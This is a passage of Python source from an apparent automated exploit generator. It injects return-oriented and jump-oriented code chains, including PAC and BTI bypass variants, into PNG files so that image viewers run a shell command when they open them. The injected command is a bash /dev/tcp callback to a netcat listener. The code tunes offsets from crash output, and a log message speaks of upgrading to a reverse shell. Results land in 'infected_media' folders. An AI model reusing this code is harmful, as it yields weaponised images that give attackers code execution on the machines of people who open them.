                logger.error(f"Payload injection failed for {viewer_name} + {fuzz_type} (Retry {retry_attempt}) due to copy error.")
                results_for_combination.append({
                    "viewer": viewer_name,
                    "fuzz_type": fuzz_type,
                    "file": base_file_name,
                    "status": "INJECTION_FAILED",
                    "payload_validated": False,
                    "platform": self.platform_id,
                    "timestamp": time.time(),
                    "payload_offset_attempted": current_payload_offset,
                    "trigger_offset_attempted": current_trigger_offset,
                    "retry_attempt": retry_attempt,
                    "reason": "file copy error"
                })
                continue # Skip to next retry/combination
            
            unique_id = f"pwned_{viewer_name}_{fuzz_type}_{int(time.time())}_{retry_attempt}"
            payload_source_file = None
            payload_source_offset = None
            payload_delta_description = None
            reuse_png_consumer_base = False

            # If we have a validated png_consumer exploit for this fuzz type, reuse the same payload image as a starting point.
            source_case = None
            if viewer_name != "png_consumer":
                source_case = next((case for case in reversed(self.png_consumer_successes) if case["fuzz_type"] == fuzz_type), None)
                if source_case and os.path.exists(source_case["file_path"]):
                    logger.info(f"Reusing validated png_consumer image {source_case['file_path']} for {viewer_name} {fuzz_type}")
                    try:
                        shutil.copy2(source_case["file_path"], test_file_path)
                        payload = source_case["payload"]
                        unique_id = source_case["unique_id"]
                        payload_source_file = source_case["file_path"]
                        payload_source_offset = source_case.get("payload_offset", 0)
                        payload_delta_description = f"reused png_consumer payload with source offset {payload_source_offset}"
                        reuse_png_consumer_base = True
                    except Exception as e:
                        logger.warning(f"Failed to reuse png_consumer base file: {e}")

            # Generate payload based on viewer type
            payload = f"bash -c 'echo {unique_id} > /dev/tcp/127.0.0.1/24444 2>&1'"
            injection_strategy = None
            injection_success = False
            if reuse_png_consumer_base:
                injection_success = True
            elif fuzz_type == "metadata_trigger":
                injection_success = inject_metadata_trigger(test_file_path, payload)
            else:
                injection_strategy = self._select_chunk_injection_strategy(retry_attempt, base_file_name)
                injection_success = inject_payload_with_leaks(
                    test_file_path,
                    payload,
                    trigger_offset=current_trigger_offset,
                    fuzz_type=fuzz_type,
                    leaks=self.leaks,
                    payload_offset=current_payload_offset,
                    viewer_name=viewer_name,
                    unique_id=unique_id,
                    chunk_injection_strategy=injection_strategy,
                )

            if injection_success:
                current_timestamp = time.time() # Capture timestamp before viewer run

                # Ensure persistent netcat listener is running before payload execution
                self.ensure_netcat_listener()
                nc_process = self.netcat_process
                nc_output_file = self.netcat_output_file

                if "/dev/tcp" in payload and (not nc_process or nc_process.poll() is not None):
                    logger.warning("Netcat listener went down, restarting persistent listener")
                    nc_process, nc_output_file, _ = self.ensure_netcat_listener_state() 
                    self.netcat_process = nc_process
                    self.netcat_output_file = nc_output_file    
                else:
                    logger.info(f"Netcat listener is operational, continuing payload execution for {viewer_name} {fuzz_type}")
                    

                status, fitting_info = self.fuzz_viewer(viewer, test_file_path, unique_id, payload, nc_process=nc_process, nc_output_file=nc_output_file)

                # If status is not SUCCESS, do a second verification check in case the first one missed it due to timing
                if status != "SUCCESS":
                    executed_log = verify_payload_execution(
                        unique_id,
                        viewer["name"],
                        payload,
                        timeout=5,
                        nc_process=nc_process,
                        nc_output_file=nc_output_file,
                        viewer_process=None,
                    )
                    if executed_log:
                        logger.info(f"Payload execution confirmed on second check, correcting status to SUCCESS for {viewer_name}")
                        status = "SUCCESS"
                        fitting_info = None

                # Do NOT terminate persistent netcat after each run; keep active for all retries

                # Preserve netcat output file for post-mortem; no deletion.
                # If a temporary file path is used, preserve by renaming to persistent.
                if nc_output_file and os.path.exists(nc_output_file):
                    self.netcat_output_file = nc_output_file
                    logger.debug(f"Netcat output file confirmed at {nc_output_file}")
                
                    try:
                        stable_path = os.path.join(self.netcat_log_dir, f"netcat_{int(time.time())}.log")
                        if nc_output_file != stable_path:
                            os.rename(nc_output_file, stable_path)
                            self.netcat_output_file = stable_path
                            nc_output_file = stable_path
                            logger.info(f"Preserved netcat output by renaming to {stable_path}")
                    except Exception as e:
                        logger.error(f"Failed preserving netcat output file: {e}")

                logger.info(f"Result for {viewer['name']} + {fuzz_type} (Retry {retry_attempt}, Offset {current_payload_offset}, Trigger Offset {current_trigger_offset}): {status}")

                reason = "unknown" # Default reason
                confidence_score = 0.0  # Confidence calculation based on status
                if status == "SUCCESS":
                    reason = "payload executed"
                    confidence_score = 1.0  # Highest confidence for successful execution
                elif status == "SUCCESS_PAC_ROP":
                    reason = "payload executed (PAC-ROP bypass)"
                    confidence_score = 0.95
                elif status == "SUCCESS_JOP":
                    reason = "payload executed (JOP bypass)"
                    confidence_score = 0.95
                elif status == "SUCCESS_VOP":
                    reason = "payload executed (VOP bypass)"
                    confidence_score = 0.95
                elif status == "SUCCESS_DOP":
                    reason = "payload executed (DOP bypass)"
                    confidence_score = 0.95
                elif status == "PAYLOAD_FOUND_FITTING_CALCULATED":
                    reason = "leaked addresses need modification"
                    confidence_score = 0.7  # High confidence that the approach is correct but needs adjustment
                elif status == "FAILED":
                    reason = "not triggered"
                    confidence_score = 0.1  # Low confidence that this combination will work
                elif status == "CRASHED":
                    reason = "crashed"
                    confidence_score = 0.3  # Moderate confidence - we triggered something
                elif status == "CRASHED_INVALID_WEAKNESS":
                    reason = "crashed (invalid weakness)"
                    confidence_score = 0.0  # Invalid weakness should be retried with different types
                elif status == "CRASHED_APPORT":
                    reason = "crashed (Apport detected)"
                    confidence_score = 0.4  # Moderate confidence - detected crash but may not be reliable

                # Compute enhanced fitness score
                payload_len = len(payload) if isinstance(payload, bytes) else len(payload.encode())
                
                # Load alignment analysis and debug metadata from debug file
                alignment_info = {}
                debug_data = {}
                debug_file = f"{test_file_path}.debug"
                if os.path.exists(debug_file):
                    try:
                        with open(debug_file, 'r') as df:
                            debug_data = json.load(df)
                            alignment_info = debug_data.get("trigger_alignment", {})
                    except Exception:
                        alignment_info = {}
                        debug_data = {}
                
                # Detect mitigations for this viewer
                mitigation_info = detect_cfi_bti_mitigations(viewer_name)
                
                # Compute fitness
                fitness_score = compute_enhanced_fitness_score(
                    fuzz_type=fuzz_type,
                    chain_type=debug_data.get("chain_type", "ROP"),
                    payload_size=payload_len,
                    trigger_alignment=alignment_info,
                    mitigation_info=mitigation_info,
                    execution_confirmed=("SUCCESS" in status)
                )

                result_entry = {
                    "viewer": viewer_name,
                    "fuzz_type": fuzz_type,
                    "file": base_file_name,
                    "status": status,
                    "payload_validated": ("SUCCESS" in status) or bool(executed_log),
                    "platform": self.platform_id,
                    "timestamp": current_timestamp,
                    "payload_offset_attempted": current_payload_offset,
                    "trigger_offset_attempted": current_trigger_offset,
                    "retry_attempt": retry_attempt,
                    "reason": reason,
                    "confidence_score": confidence_score,
                    "payload_source_file": payload_source_file,
                    "payload_source_offset": payload_source_offset,
                    "payload_delta_description": payload_delta_description,
                    "injection_strategy": injection_strategy if 'injection_strategy' in locals() else None,
                    # New enhanced fields
                    "fitness_score": fitness_score.get("overall_score", 0.0),
                    "fitness_category": fitness_score.get("fitness_category", "unknown"),
                    "fitness_details": fitness_score,
                    "mitigation_state": mitigation_info.get("mitigation_state", "not_detected"),
                    "cfi_enabled": mitigation_info.get("cfi_enabled", False),
                    "bti_enabled": mitigation_info.get("bti_enabled", False),
                }

                if status != "SUCCESS" and fitting_info and fitting_info.get("payload_addr") and fitting_info.get("offsets"):
                    print(f"Fitting info for {viewer_name} + {fuzz_type}: Payload address: {hex(fitting_info['payload_addr'])}, Offsets: {fitting_info['offsets']}" )
                    result_entry["fitting_payload_addr"] = hex(fitting_info["payload_addr"])
                    result_entry["fitting_offsets"] = fitting_info["offsets"]

                # Check for Apport crashes after each attempt
                if self.use_intelligent or self.use_advisor:
                    apport_crash_info = self._check_for_new_apport_crashes(test_file_path, current_timestamp)
                    if apport_crash_info:
                        logger.critical(f"Apport crash detected for {test_file_path}. Updating result entry.")
                        result_entry["apport_crash_features"] = _extract_apport_crash_features(apport_crash_info)
                        if result_entry["status"] != "CRASHED": # If not already marked as crashed by GDB
                            result_entry["status"] = "CRASHED_APPORT"
                            result_entry["reason"] = "crashed (Apport detected)"
                        # Potentially update success_label for ML training
                        result_entry["success_label"] = 0 # A crash is a failure for payload execution

                results_for_combination.append(result_entry)

                if "SUCCESS" in status:
                    logger.info(f"Saved successful sample: {test_file_path}")
                    
                    # Record png_consumer successful payload templates for reuse by other viewers
                    if viewer_name == "png_consumer":
                        self.png_consumer_successes.append({
                            "fuzz_type": fuzz_type,
                            "file_path": test_file_path,
                            "payload": payload,
                            "payload_offset": current_payload_offset,
                            "trigger_offset": current_trigger_offset,
                            "unique_id": unique_id,
                            "status": status,
                            "reason": reason
                        })
                        if ("VOP" in status or "DOP" in status):
                            self.png_consumer_vop_dop_success = True
                            logger.info("VOP/DOP success detected on png_consumer - will upgrade payloads for other viewers to use netcat rshell")
                    
                    # Log to TensorBoard if not png_consumer
                    if viewer_name != "png_consumer" and status == "SUCCESS":
                        try:
                            writer = SummaryWriter(f"runs/fuzzing/validated_payloads")
                            log_validated_payload_to_tensorboard(
                                writer, test_file_path, viewer_name, fuzz_type, 
                                step=int(time.time())
                            )
                            writer.close()
                        except Exception as e:
                            logger.error(f"Failed to log validated payload to TensorBoard: {e}")

                    # NEW: Attempt additional chains for BTI/PAC bypass testing
                    if fuzz_type in ["overflow", "uaf", "double_free", "metadata_trigger"]:
                        
                        pac_enabled = bool(self.leaks.get("pac_enabled", False))
                        vop_available = bool(self.leaks.get("gadget_vop_ldr_str_q0") or self.leaks.get("gadget_vop_fmov"))
                        
                        additional_chains = []
                        if pac_enabled and fuzz_type in ["uaf", "optimization_bypass"]:  # Match inject_payload_with_leaks condition
                            additional_chains.extend(["PAC_ROP", "JOP"])
                        if vop_available:
                            additional_chains.extend(["VOP", "DOP"])

                        
                        for chain in additional_chains:
                            logger.info(f"Attempting {chain} chain for {viewer_name} + {fuzz_type} with same settings...")
                            
                            # Create new test file for this chain
                            chain_file_name = f"{base_file_name}.{viewer_name}.{fuzz_type}.{chain}.png"
                            chain_file_path = os.path.join(output_dir, chain_file_name)
                            
                            chain_status = "FAILED"
                            try:
                                shutil.copy2(test_file_path, chain_file_path)
                                
                                # Inject with forced chain type
                                chain_injection_success = inject_payload_with_leaks(
                                    chain_file_path, payload, 
                                    trigger_offset=current_trigger_offset, 
                                    fuzz_type=fuzz_type, 
                                    leaks=self.leaks, 
                                    payload_offset=current_payload_offset,
                                    force_chain_type=chain,
                                    viewer_name=viewer_name,
                                    unique_id=unique_id,
                                    chunk_injection_strategy=injection_strategy,
                                )
                                
                                if chain_injection_success:
                                    chain_status, _ = self.fuzz_viewer(viewer, chain_file_path, unique_id, payload)
                                    
                                    if "SUCCESS" in chain_status:
                                        logger.info(f"SUCCESS: {chain} chain bypassed BTI/PAC for {viewer_name} + {fuzz_type}")
                                        
                                        # Log successful bypass to TensorBoard
                                        try:
                                            writer = SummaryWriter(f"runs/fuzzing/bti_pac_bypasses")
                                            log_validated_payload_to_tensorboard(
                                                writer, chain_file_path, viewer_name, f"{fuzz_type}_{chain}", 
                                                step=int(time.time())
                                            )
                                            writer.close()
                                        except Exception as e:
                                            logger.error(f"Failed to log bypass to TensorBoard: {e}")
                                        
                                        # Add to results
                                        results_for_combination.append({
                                            "viewer": viewer_name,
                                            "fuzz_type": f"{fuzz_type}_{chain}",
                                            "file": base_file_name,
                                            "status": f"SUCCESS_{chain}",
                                            "payload_validated": True,
                                            "platform": self.platform_id,
                                            "timestamp": time.time(),
                                            "payload_offset_attempted": current_payload_offset,
                                            "trigger_offset_attempted": current_trigger_offset,
                                            "retry_attempt": retry_attempt,
                                            "reason": f"{chain} bypass successful",
                                            "confidence_score": 0.95
                                        })
                                    else:
                                        logger.info(f"FAILED: {chain} chain did not bypass for {viewer_name} + {fuzz_type}")
                                
                                # Clean up chain file if not successful
                                if not ("SUCCESS" in chain_status):
                                    if os.path.exists(chain_file_path):
                                        #rename to indicate failure instead of deletion for post-mortem analysis 
                                        failed_chain_path = chain_file_path.replace(".png", ".failed.png") 
                                        os.rename(chain_file_path, failed_chain_path)
                                        logger.info(f"Renamed failed chain file to {failed_chain_path} for analysis.")
                            
                            except Exception as e:
                                logger.error(f"Error testing {chain} chain: {e}")

                    return results_for_combination # Exit on success
                elif status == "PAYLOAD_FOUND_FITTING_CALCULATED" and fitting_info and fitting_info["offsets"]:
                    # Check if PC is already at payload (offset 0x0)
                    pc_offset_match = re.search(r"Register pc is at (0x[0-9a-f]+) \(offset (0x0) from payload\)", "\n".join(fitting_info["offsets"]))
                    
                    if pc_offset_match:
                        logger.info("PC register is already at payload start. Adjusting internal chain addresses instead of payload offset.")
                        # Re-inject payload with the same offset, but trigger recompilation of the chain
                        # with the actual payload_addr from fitting_info as chain_base_addr.
                        # This will adjust the gadget addresses within the chain.
                        if not inject_payload_with_leaks(test_file_path, payload, trigger_offset=current_trigger_offset,
                                                         fuzz_type=fuzz_type, leaks=self.leaks,
                                                         payload_offset=current_payload_offset, # Keep the same payload_offset
                                                         chain_base_addr=fitting_info["payload_addr"], # Pass actual payload_addr
                                                         viewer_name=viewer_name,
                                                         unique_id=unique_id,
                                                         chunk_injection_strategy=injection_strategy):
                            logger.error(f"Failed to re-inject payload with adjusted chain for {viewer_name} + {fuzz_type} (Retry {retry_attempt})")
                            break # Exit retry loop if re-injection fails
                        else:
                            logger.info(f"Successfully re-injected payload with adjusted chain for {viewer_name} + {fuzz_type} (Retry {retry_attempt}). Re-evaluating...") 

                        # After re-injection, continue to the next retry to re-evaluate
                        continue
                    else:
                        # PC is not at payload, so adjust the payload offset
                        offset_match = re.search(r"offset (-?0x[0-9a-f]+)", fitting_info["offsets"][0])
                        if offset_match:
                            new_offset = int(offset_match.group(1), 16)
                            if new_offset not in tried_offsets:
                                current_payload_offset = new_offset
                                tried_offsets.add(new_offset)
                                logger.info(f"Applying new payload offset: {current_payload_offset} for next retry.")
                                continue # Continue to next retry with new offset
                            else:
                                logger.warning(f"Suggested offset {hex(new_offset)} already tried. Trying next additional offset.")
                        else:
                            logger.warning("Could not parse offset from fitting info. Trying next additional offset.")
                        
                        # If suggested offset was already tried or not parsed, try an additional offset
                        if additional_offsets:
                            current_payload_offset = additional_offsets.pop(0)
                            tried_offsets.add(current_payload_offset)
                            logger.info(f"Trying additional payload offset: {current_payload_offset}.")
                            continue
                        else:
                            logger.warning("No more additional offsets to try.")
                            # If no more offsets, and still PAYLOAD_FOUND_FITTING_CALCULATED, update reason
                            results_for_combination[-1]["reason"] = "leaked addresses need modification (retries exhausted)"
                            break # Exit retry loop

                elif status == "CRASHED_INVALID_WEAKNESS":
                    logger.error(f"Invalidating {fuzz_type} for {viewer['name']} due to critical error.")
                    invalid_fuzz_types.add(fuzz_type) # Add to the passed-in set
                    if os.path.exists(test_file_path): os.remove(test_file_path)
                    return results_for_combination # Exit, as this weakness is invalid
                elif "CRASHED" in status:
                    logger.info(f"Saved crash sample: {test_file_path}")
                    # If crashed but no fitting info, or all retries with fitting failed, stop for this combo
                    break 
                else:
                    if os.path.exists(test_file_path): 
                        try:
                            logger.info(f"Removing {test_file_path} due to  status: {status}") 
                            os.remove(test_file_path)
                        except Exception as e:
                            logger.error(f"Failed to remove {test_file_path}: {e}") 

            else:
                logger.error(f"Payload injection failed for {viewer['name']} + {fuzz_type} (Retry {retry_attempt})")
                results_for_combination.append({
                    "viewer": viewer_name,
                    "fuzz_type": fuzz_type,
                    "file": base_file_name,
                    "status": "INJECTION_FAILED",
                    "payload_validated": False,
                    "platform": self.platform_id,
                    "timestamp": time.time(),
                    "payload_offset_attempted": current_payload_offset,
                    "trigger_offset_attempted": current_trigger_offset, # New field
                    "retry_attempt": retry_attempt, # New field: Store retry attempt
                    "reason": "injection failed"
                })
                if os.path.exists(test_file_path): 
                    try:
                        os.remove(test_file_path)
                    except FileNotFoundError as fe:
                        print(fe)
                    except:
                        pass

            
            # If we reached here, it means current_payload_offset didn't lead to success or fitting.
            # Try next additional offset if available, otherwise break.
            if retry_attempt < max_retries - 1 and additional_offsets and not (self.use_intelligent or self.use_advisor): # Only use additional offsets if not using ML suggestions
                current_payload_offset = additional_offsets.pop(0)
                tried_offsets.add(current_payload_offset)
                logger.info(f"Trying additional payload offset: {current_payload_offset}.")
                continue
            else:
                break # No more retries or offsets to try
        
        return results_for_combination # Corrected to return results_for_combination

    def _parse_crash_callstack(self, crash_output: str) -> Dict[str, any]:
        """Parse crash callstack from png_consumer to extract crash info and success indicators."""
        crash_info = {
            "has_crash": False,
            "has_success": False,
            "has_vulnerability": False,
            "crash_address": None,
            "crash_function": None,
            "crash_offset": None,
            "faulting_module": None,
            "signal": None,
            "top_frames": [],
            "success_indicators": [],
            "error_messages": []
        }
        
        if not crash_output:
            return crash_info
        
        lines = crash_output.split('\n')
        
        # Check for success completion
        if "Simulated libpng processing complete" in crash_output:
            crash_info["has_success"] = True
            crash_info["success_indicators"].append("Simulated libpng processing complete")
        
        # Check for vulnerability trigger patterns
        if "VULNERABILITY TRIGGERED" in crash_output:
            crash_info["has_vulnerability"] = True
            vulnerability_lines = [line for line in lines if "VULNERABILITY TRIGGERED" in line]
            crash_info["success_indicators"].extend(vulnerability_lines)
        
        # Check for crash indicators
        for line in lines:
            if "Caught signal" in line or "Stack trace" in line or "backtrace" in line.lower():
                crash_info["has_crash"] = True
                # Extract signal number if present
                import re
                sig_match = re.search(r'signal (\d+)', line)
                if sig_match:
                    crash_info["signal"] = int(sig_match.group(1))
                break
        
        # If no explicit crash signal but output contains frame information, it crashed
        if not crash_info["has_crash"] and any("png_consumer" in line or "libpng" in line or "libc" in line for line in lines):
            crash_info["has_crash"] = True
        
        if not crash_info["has_crash"] and not crash_info["has_success"] and not crash_info["has_vulnerability"]:
            return crash_info
        
        # Parse callstack frames
        import re
        for line in lines[:20]:  # Check first 20 lines for frame info
            # Match png_consumer frame format
            match = re.search(r'\./png_consumer\(\+0x([0-9a-f]+)\)\[0x([0-9a-f]+)\]', line)
            if match:
                crash_info["crash_offset"] = int(match.group(1), 16)
                crash_info["crash_address"] = int(match.group(2), 16)
                crash_info["faulting_module"] = "png_consumer"
                crash_info["top_frames"].append(line)
                continue
            
            # Match libpng or libc frame format
            match = re.search(r'/lib.*?(libpng[^\(]*|libc[^\(]*)\(.*?\+0x([0-9a-f]+)\)\[0x([0-9a-f]+)\]', line)
            if match:
                module = match.group(1)
                offset = int(match.group(2), 16)
                address = int(match.group(3), 16)
                if not crash_info["faulting_module"]:
                    crash_info["crash_offset"] = offset
                    crash_info["crash_address"] = address
                    crash_info["faulting_module"] = module
                crash_info["top_frames"].append(line)
                continue
            
            # Capture error messages
            if any(keyword in line for keyword in ["Error", "FATAL", "Segmentation", "Invalid", "Corrupted"]):
                crash_info["error_messages"].append(line)
        
        return crash_info

    def _run_png_consumer_direct(self, file_path: str, unique_id: str, capture_output: bool = False) -> tuple[int, Optional[str]]:
        """Run png_consumer directly and optionally capture crash output."""
        try:
            cmd = ["./png_consumer", file_path]
            if capture_output:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                try:
                    stdout, _ = proc.communicate(timeout=10)
                    return proc.returncode, stdout
                except subprocess.TimeoutExpired:
                    proc.kill()
                    return -1, None
            else:
                proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                try:
                    proc.wait(timeout=10)
                    return proc.returncode, None
                except subprocess.TimeoutExpired:
                    proc.kill()
                    return -1, None
        except Exception as e:
            logger.error(f"Error running png_consumer: {e}")
            return -1, None

    def _run_png_consumer_overflow_sanity_check(self, file_path: str, output_dir: str) -> bool:
        """Performs a quick sanity check on png_consumer using overflow and reverse-shell payload execution."""
        png_consumer_viewer = next((v for v in self.viewers if v["name"] == "png_consumer"), None)
        if png_consumer_viewer is None:
            logger.warning("png_consumer viewer config missing; skipping sanity check")
            return False

        sanity_file = os.path.join(output_dir, "png_consumer_overflow_sanity.png")
        try:
            shutil.copyfile(file_path, sanity_file)
        except Exception as e:
            logger.error(f"Failed to copy base PNG for sanity check: {e}")
            return False

        unique_id = f"png_consumer_sanity_{int(time.time())}"
        payload = f"bash -c 'echo {unique_id} > /dev/tcp/127.0.0.1/24444 2>&1'"

        nc_process, nc_output_file, _ = self.ensure_netcat_listener()
        
        logger.info(f"Running png_consumer overflow sanity check on {sanity_file} with unique_id={unique_id}")
        success = inject_payload_with_leaks(
            sanity_file,
            payload,
            fuzz_type="overflow",
            viewer_name="png_consumer",
            unique_id=unique_id,
            force_chain_type="ROP",
            chunk_injection_strategy=self._select_chunk_injection_strategy(0, sanity_file),
        )

        if not success:
            logger.warning("Sanity check injection failed for png_consumer overflow")
            return False

        # Run png_consumer directly and capture crash output
        returncode, crash_output = self._run_png_consumer_direct(sanity_file, unique_id, capture_output=True)
        
        # Parse crash output to check for success, vulnerability, or crash indicators
        crash_info = self._parse_crash_callstack(crash_output if crash_output else "")
        
        # Check for successful completion
        if crash_info["has_success"]:
            logger.info(f"png_consumer sanity check passed - successful completion detected")
            logger.debug(f"Success indicators: {crash_info['success_indicators']}")
            return True
        
        # Check for vulnerability trigger
        if crash_info["has_vulnerability"]:
            logger.info(f"png_consumer sanity check passed - vulnerability triggered")
            logger.debug(f"Vulnerability indicators: {crash_info['success_indicators']}")
            
            # First check if payload executed via netcat
            time.sleep(0.5)
            payload_executed = verify_payload_execution(
                unique_id,
                "png_consumer",
                payload,
                timeout=3,
                nc_process=nc_process,
                nc_output_file=nc_output_file,
                viewer_process=None,
            )
            if payload_executed:
                logger.info("Payload execution confirmed via netcat")
                return True
            else:
                logger.warning("Vulnerability triggered but payload execution not confirmed via netcat")
                return False
        
        # First check if payload executed via netcat
        time.sleep(0.5)
        payload_executed = verify_payload_execution(
            unique_id,
            "png_consumer",
            payload,
            timeout=3,
            nc_process=nc_process,
            nc_output_file=nc_output_file,
            viewer_process=None,
        )
        if payload_executed:
            logger.info("png_consumer overflow sanity check passed - payload execution confirmed")
            return True
        
        # If payload didn't execute but we have crash output, analyze for fitting information
        if returncode != 0 and crash_output:
            logger.info(f"png_consumer crashed with return code {returncode}, analyzing crash for payload fitting...")
            
            if crash_info["has_crash"]:
                logger.info(f"Crash detected in {crash_info['faulting_module']}")
                if crash_info["signal"]:
                    logger.info(f"Signal: {crash_info['signal']}")
                if crash_info["crash_offset"]:
                    logger.info(f"Crash offset: 0x{crash_info['crash_offset']:x}")
                if crash_info["top_frames"]:
                    logger.info(f"Top frames:\n" + "\n".join(crash_info["top_frames"][:3]))
                
                # Log crash details for reference
                with open(f"{sanity_file}.crash_output.txt", 'w') as f:
                    f.write(crash_output)
                
                # If crash occurred, it means the injection at least triggered execution
                # Mark as partial success - the chain reached but payload didn't execute
                logger.warning("Sanity check: png_consumer crashed but payload didn't execute. Injection is working but needs refinement.")
                return False
            else:
                logger.warning("Return code indicates crash but no crash output captured")
                if crash_output:
                    logger.debug(f"Output received:\n{crash_output[:500]}")
        
        logger.warning("png_consumer overflow sanity check failed - no crash output and payload not executed")
        if crash_output:
            logger.debug(f"Captured output:\n{crash_output[:500]}")
        return False

    def fuzz_single_file(self, file_path: str) -> List[Dict]:
        """Fuzzes a single file against all viewers and weaknesses, saving successful samples."""
        request_sudo_if_needed()
        # The base PNG file should already exist, created by the caller (e.g., test setup).
        # No need to generate it here.
        if not os.path.exists(file_path):
            logger.error(f"Base PNG file not found: {file_path}. This should have been created by the caller.")
            return [] # Cannot proceed without the base file
        if not os.path.exists(file_path):
            logger.error(f"Base PNG file not found: {file_path}. This should have been created by the caller.")
            return [] # Cannot proceed without the base file
        
        all_results = [] # Initialize all_results here
        base_file_name = os.path.basename(file_path)
        output_dir = os.path.join(os.path.dirname(file_path), "fuzz_results_single")
        os.makedirs(output_dir, exist_ok=True)

        sanity_passed = self._run_png_consumer_overflow_sanity_check(file_path, output_dir)
        all_results.append({
            "timestamp": time.time(),
            "original_file": file_path,
            "viewer": "png_consumer",
            "fuzz_type": "overflow_sanity",
            "status": "SANITY_CHECK_PASSED" if sanity_passed else "SANITY_CHECK_FAILED",
            "reason": "Base png_consumer overflow reverse-shell sanity check",
            "retry_attempt": 0,
            "payload_validated": sanity_passed,
            "platform": self.platform_id,
            "payload_offset_attempted": 0,
            "trigger_offset_attempted": 0,
            "fitting_payload_addr": "",
            "fitting_offsets": [],
            "success_label": 1 if sanity_passed else 0,
            "confidence_score": 1.0 if sanity_passed else 0.0,
        })

        # Phase 1: Fuzz png_consumer sequentially
        logger.info(f"Starting sequential fuzzing for png_consumer on {base_file_name}...")
        png_consumer_viewer = next(v for v in self.viewers if v["name"] == "png_consumer")
        invalid_fuzz_types_for_consumer = set()
        
        # Define viewer_output_dir for png_consumer
        png_consumer_output_dir = os.path.join(output_dir, png_consumer_viewer["name"])
        os.makedirs(png_consumer_output_dir, exist_ok=True)

        for fuzz_type in self.weaknesses:
            combo_results = self._fuzz_single_combination(file_path, base_file_name, png_consumer_viewer, fuzz_type, png_consumer_output_dir, invalid_fuzz_types_for_consumer)
            all_results.extend(combo_results)
            # Propagate invalid fuzz types
            for res in combo_results:
                if res["status"] == "CRASHED_INVALID_WEAKNESS":
                    invalid_fuzz_types_for_consumer.add(res["fuzz_type"])

        # Phase 2: Parallelize fuzzing for other viewers
        logger.info(f"Starting parallel fuzzing for other viewers on {base_file_name}...")
        other_viewers = [v for v in self.viewers if v["name"] != "png_consumer"]
        
        tasks = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=os.cpu_count() * 2) as executor:
            for viewer in other_viewers:
                invalid_fuzz_types_for_viewer = set() # Keep track of invalid types per viewer for this folder run
                viewer_output_dir = os.path.join(output_dir, viewer["name"]) # Define viewer_output_dir for other viewers
                os.makedirs(viewer_output_dir, exist_ok=True)
                for fuzz_type in self.weaknesses:
                    # Only fuzz with valid types
                    if fuzz_type not in invalid_fuzz_types_for_consumer: # Also consider global invalidations from consumer
                        tasks.append(executor.submit(self._fuzz_single_combination, file_path, base_file_name, viewer, fuzz_type, viewer_output_dir, invalid_fuzz_types_for_viewer))
            
            for future in concurrent.futures.as_completed(tasks):
                combo_results = future.result()
                all_results.extend(combo_results)
                # The invalid_fuzz_types_for_viewer set is passed by reference, so it's updated directly within _fuzz_single_combination.
                # No need to explicitly propagate here.

        # Save overall results for single file fuzzing
        if all_results:
            with open(os.path.join(output_dir, f"{base_file_name}_results.json"), "w") as f:
                json.dump(all_results, f, indent=2)
            save_trajectory_database(all_results, output_dir)
            
        return all_results

    def fuzz_platform(self, source_dir: str):
        """Orchestrates the infection and monitoring loop across a folder of images and all viewers."""
        request_sudo_if_needed()
        target_base_dir = f"infected_media_unified_{self.platform_id}"
        os.makedirs(target_base_dir, exist_ok=True)

        # Reconcile all previous trajectory contexts (--single and --platform runs)
        self._reconcile_all_previous_runs()

        png_files = [f for f in os.listdir(source_dir) if f.lower().endswith('.png')]
        if not png_files:
            logger.error(f"No PNG files found in {source_dir}")
            return

        all_results = []
        file_path = os.path.join(source_dir, png_files[0]) # Use the first file for sanity check, as a representative sample of the base PNG structure 
        output_dir = os.path.join(target_base_dir, "sanity_check")
        os.makedirs(output_dir, exist_ok=True)
        sanity_passed = self._run_png_consumer_overflow_sanity_check(file_path, output_dir)
        if not sanity_passed:
            logger.error(f"Sanity check failed for {file_path}")
            return
        
        # Proceed with fuzzing if sanity check passes
        logger.info(f"Fuzzing platform: {self.platform_id}")
        
        tasks = []
        # Max workers can be adjusted based on system resources.
        # Using a ThreadThreadPoolExecutor for I/O-bound tasks (running external commands).
        with concurrent.futures.ThreadPoolExecutor(max_workers=os.cpu_count() * 2) as executor:
            for viewer in self.viewers:
                viewer_name = viewer["name"]
                viewer_output_dir = os.path.join(target_base_dir, viewer_name)
                os.makedirs(viewer_output_dir, exist_ok=True)
                
                logger.info(f"Starting fuzzing for viewer: {viewer_name}")
                
                invalid_fuzz_types_for_viewer = set() # Keep track of invalid fuzz types per viewer for this folder run

                for png_file in png_files:
                    full_png_path = os.path.join(source_dir, png_file)
                    
                    # Submit each (file, viewer, fuzz_type) combination as a separate task
                    for fuzz_type in self.weaknesses:
                        tasks.append(executor.submit(self._fuzz_single_combination, full_png_path, png_file, viewer, fuzz_type, viewer_output_dir, invalid_fuzz_types_for_viewer))
            
            for future in concurrent.futures.as_completed(tasks):
                combo_results = future.result()
                all_results.extend(combo_results)
                # The invalid_fuzz_types_for_viewer set is passed by reference, so it's updated directly within _fuzz_single_combination.
                # No need to explicitly propagate here.

        save_trajectory_database(all_results, target_base_dir)
        logger.info(f"Unified fuzzing session complete. Results saved to {target_base_dir}/fuzzing_trajectory.csv")

    def __del__(self):
        """Cleanup suspended viewer processes when the fuzzer is destroyed."""
        global _suspended_viewer_processes 
        global _suspended_viewer_lock

        with _suspended_viewer_lock:
            if _suspended_viewer_processes and len(_suspended_viewer_processes) > 0:
                logger.info(f"Cleaning up {len(_suspended_viewer_processes)} suspended viewer processes...")
                for key, proc_info in list(_suspended_viewer_processes.items()):
                    try:
                        cleanup_suspended_viewer(proc_info['unique_id'], proc_info['file_path'])
                    except Exception as e:
                        logger.debug(f"Error cleaning up suspended process {key}: {e}")
                _suspended_viewer_processes.clear()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--source", type=str, default="generated_image_samples", help="Source directory for PNG files (for folder fuzzing).")
    parser.add_argument("--platform", type=str, default=platform.platform().lower().replace("-", "_"), help="Platform identifier.")
    parser.add_argument("--single", type=str, help="Path to a single PNG file to fuzz.")
    parser.add_argument("--advisor", action="store_true", help="Enable advisor mode (log suggestions, don't apply).")
    parser.add_argument("--legacy", action="store_true", help="Enable legacy fuzzing (no intelligent suggestions).")
    parser.add_argument("--intelligent", action="store_true", help="Enable intelligent fuzzing (apply suggestions).")
    parser.add_argument("--train", action="store_true", help="Train the ML model using historical data.")
